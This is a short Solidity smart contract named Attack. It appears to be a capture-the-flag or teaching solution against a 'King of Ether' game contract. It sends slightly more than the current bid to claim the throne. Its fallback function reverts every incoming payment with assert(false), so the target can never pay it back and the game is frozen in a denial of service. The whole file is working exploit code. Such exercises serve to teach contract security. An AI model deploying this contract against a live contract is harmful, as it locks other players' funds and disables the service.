// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

contract Attack{
     address payable kingOfEther;

    constructor(address payable _kingOfEther) public payable {
        kingOfEther = _kingOfEther;
    }

    fallback() external payable {
         assert(false);
    }

    function attack() public payable {
        (bool success, ) = payable(address(kingOfEther)).call{value: 1000000000000001}("");
        require(success, "External call failed");
    }
}